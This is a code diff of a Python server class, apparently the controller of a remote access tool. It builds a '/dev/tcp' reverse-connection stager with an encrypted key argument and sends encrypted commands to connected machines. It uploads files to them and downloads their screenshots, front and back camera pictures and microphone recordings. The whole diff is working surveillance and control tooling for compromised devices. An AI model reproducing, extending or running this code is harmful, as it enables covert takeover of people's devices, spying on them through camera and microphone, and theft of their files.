@@ -7,11 +7,12 @@ import socket
 import sys
 import time
 from threading import Thread
-from src.encryption.ESEncryptor import ESEncryptor
-from src.shell.shell import ESShell
+from modules.encryption.ESEncryptor import ESEncryptor
+from modules.shell.shell import ESShell
 import random
 import string
 import json
+import base64
 
 datadir = "data"
 
@@ -39,10 +40,11 @@ class ESServer:
         return ''.join((random.choice(string.letters)) for x in range(16))
 
     def listen(self,host,port,verbose):
+        host = socket.gethostbyname(host)
         term = self.term()
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
         INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
-            str(host)+" "+str(port)+" "+self.escryptor.key+" "+term
+            json.dumps({"ip":host,"port":str(port),"key":self.escryptor.key,"term":term,"debug":1})
         )
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
@@ -138,7 +140,8 @@ class ESServer:
         else:
             self.h.strinfo("closing connection")
             time.sleep(1)
-    
+
+        
     #MARK: Multiserver
     def multiServerListen(self,host,port):
         x = 1
@@ -258,24 +261,30 @@ class ESServer:
             self.h.strinfo("Please specify a session id")
 
 
-    def packcommand(self,str,term):
+    def packcommand(self,cmd,args,type,term):
         #json encode and encrypt
-        data = json.dumps({"cmd":str.split()[0],
+        data = json.dumps({"cmd":cmd,
+                          "args":args,
                           "term":term,
-                          "args":str[len(str.split()[0])+1:]})
+                          "type":type})
         return self.escryptor.encryptString(data)
 
-    def sendCommand(self,str,conn):
+    def sendCommand(self,cmd,args,type,conn):
         #create terminator for reply data and send data
         terminator = self.term()
-        conn.send(self.packcommand(str,terminator))
+        conn.send(self.packcommand(cmd,args,type,terminator))
         #receive response
         try:
-            rdata = self.receiveString(conn,terminator)
-            if rdata != "":
-                print rdata
+            #downloads are called from sendCommand
+            if type == "download":
+                self.downloadFile(cmd+" "+args,terminator,conn)
+            else:
+                rdata = self.receiveString(conn,terminator)
+                if rdata != "":
+                    return rdata.rstrip("\n")
         except Exception as e:
             print e
+        return ""
 
     def receiveString(self,conn,terminator):
         #live terminator is just terminator reversed
@@ -315,37 +324,47 @@ class ESServer:
             #if we are live send kill task
             except KeyboardInterrupt:
                 print ""
-                conn.send(self.packcommand("endtask",terminator))
+                conn.send(self.packcommand("endtask","","",terminator))
 
 
-    def uploadFile(self,fileName,location,conn):
+    def uploadFile(self,fileName,uploadPath,conn):
         terminator = self.term()
+        #get file data
+        if os.path.exists(fileName) == False:
+            self.h.strinfo(fileName + " not found")
+            return
         f = open(fileName,"rb")
-        fileData = self.h.bben(f.read())
+        fileData = f.read()
         f.close()
-        filesize = str(sys.getsizeof(fileData))
-        #send cmd
-        conn.send(self.packcommand("installpro",terminator))
-        #check if we are good to go
-        status = self.receiveString(conn,terminator)
-        if status == "1":
-            #sendfile
-            self.h.strinfo("Uploading "+fileName)
-            self.h.strinfo("Size = "+filesize)
-            conn.send(fileData+terminator)
-            #blank
-            conn.recv(128)
-            self.h.strinfo("Finished")
-        else:
-            self.h.strinfo(status)
+        #TODO: encrypt the data
+        #fileData = self.escryptor.encode(fileData)
+        fileData = base64.b64encode(fileData)
+        #get file size
+        sizeofFile = sys.getsizeof(fileData)
+        #send data
+        data = json.dumps({"cmd":"upload",
+                          "args":uploadPath,
+                          "term":terminator,
+                          "type":"upload",
+                      "filesize":len(fileData)})
+        conn.send(self.escryptor.encryptString(data))
+        #receive go ahead
+        conn.recv(256)
+        progress = 0
+        self.h.strinfo("Uploading "+fileName)
+        conn.send(fileData+terminator)
+        conn.recv(256)
 
-    def downloadFile(self,command,conn):
-        #send download command
-        term = self.term()
-        conn.send(self.packcommand(command,term))
-        sof = self.escryptor.decrypt(conn.recv(128))
-        
-        args = command.split()
+    def downloadFile(self,cmdraw,terminator,conn):
+        #TODO: send upload command within this function
+        #receive size of file
+        sizedata = ""
+        while 1:
+            sizedata += conn.recv(16)
+            if terminator in sizedata:
+                break
+    
+        sof = self.escryptor.decrypt(sizedata.split(terminator)[0])
         
         try:
             sizeofFile = int(sof)
@@ -353,51 +372,56 @@ class ESServer:
             self.h.strinfo("Error: "+sof)
             return
         self.h.strinfo("file size: "+str(sizeofFile))
-
         #filename to write to
         if not os.path.exists(datadir):
             os.makedirs(datadir)
-        filename = ""
+        
+        #split original command
+        args = cmdraw.split()
+        
+        fileName = ""
         dateFormat = "%Y%m%d%H%M%S"
         if args[0] == "screenshot":
-            filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
+            fileName = "screenshot"+time.strftime(dateFormat)+".jpeg"
         elif args[0] == "picture":
-            filename = "isight"+time.strftime(dateFormat)+".jpeg"
+            fileName = "isight"+time.strftime(dateFormat)+".jpeg"
         elif args[0] == "frontcam":
-            filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
-        elif args[0] == "backcam":
-            filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
-        elif args[0] == "mic":
-            filename = "mic"+time.strftime(dateFormat)+".aac"
+            fileName = "frontcamera"+time.strftime(dateFormat)+".jpeg"
+        elif cmdraw == "backcam":
+            fileName = "backcamera"+time.strftime(dateFormat)+".jpeg"
+        #TODO: fix this
+        elif cmdraw == "download /tmp/.avatmp":
+            fileName = "mic"+time.strftime(dateFormat)+".aac"
         else:
-            filename = args[1].split("/")[-1]
+            fileName = args[1].split("/")[-1]
 
         progress = 0
         file = open(os.getcwd()+"/.tmpfile", "a+b")
-        #read stream into file
+        #last chunk, lets us combine to see if our terminator was sent
+        lastchunk = ""
         while 1:
-            #TODO: there is a small chance EOF will be miss-aligned, need to fix this
-            chunk = conn.recv(1024)
+            chunk = conn.recv(2048)
             progress += len(chunk)
-            #Show progress
             if progress > sizeofFile:
                 progress = sizeofFile
-            sys.stdout.write("\r"+self.h.strinfoGet(self.h.WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
-            #write to file
-            if term in chunk:
+            sys.stdout.write("\r"+self.h.strinfoGet(self.h.WHITE+"Downloading "+fileName+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
+            if terminator in lastchunk + chunk:
                 print ""
-                #replace our endoffile keyword
-                chunk = chunk.replace(term,"")
-                #write the remaining chunk
+                #todo: this could fail, fix
+                chunk = chunk.split(terminator)[0]
                 file.write(chunk)
                 file.close()
                 #decrypt with our shell key, remove tmp file
-                downloadedFile = open("data/"+filename,"wb")
+                downloadedFile = open("data/"+fileName,"wb")
                 downloadedFile.close()
-                if not self.escryptor.decryptFile(os.getcwd()+"/.tmpfile", "data/"+filename, sizeofFile):
-                    self.h.strinfo("error decrypting data :(")
+                try:
+                    self.escryptor.decryptFile(os.getcwd()+"/.tmpfile", "data/"+fileName, sizeofFile)
+                except Exception as e:
+                    print str(e)+"\n"
+                
                 os.remove(os.getcwd()+"/.tmpfile")
                 self.h.strinfo("Finished Downloading!")
                 return
             else:
+                lastchunk = chunk
                 file.write(chunk)
